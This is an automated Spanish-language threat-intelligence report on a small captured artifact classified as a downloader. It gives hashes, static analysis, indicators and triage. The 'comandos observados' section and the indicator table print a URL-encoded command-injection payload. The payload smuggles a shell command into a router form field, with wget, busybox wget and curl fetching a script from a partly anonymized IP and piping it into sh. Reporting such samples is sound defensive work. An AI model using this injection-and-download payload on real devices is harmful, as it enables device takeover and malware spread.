# 🧬 Payload Analysis

`39b60d4a31c3c1676ad63cd26ac483853b743b6e764b8e4c09cacd4b229e43e7`

## 📌 Resumen

Artefacto identificado como ASCII text, with no line terminators de 294 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `39b60d4a31c3c1676ad63cd26ac483853b743b6e764b8e4c09cacd4b229e43e7`
- **SHA1:** `b761d4f2c3b58a25f56ed745ac37d4a296e1d3c0`
- **MD5:** `451dde5b7d941b518e4a248cb8d12a6d`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 294 B |
| Entropía | 5.03 |
| Strings | 1 |

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
submit_button=&change_action=&action=&commit=0&ttcp_num=2&ttcp_size=2&ttcp_ip=-h+%60cd%20/tmp%3Bwget%20http://91.92.40.XXX
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lmoon%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lmoon%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20lmoon%60&StartEPI=1 | strings |
| ip | 91.92.40.XXX | static_analysis |
| command | submit_button=&change_action=&action=&commit=0&ttcp_num=2&ttcp_size=2&ttcp_ip=-h+%60cd%20/tmp%3Bwget%20http://91.92.40.XXX | strings |
| hash | 39b60d4a31c3c1676ad63cd26ac483853b743b6e764b8e4c09cacd4b229e43e7 | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
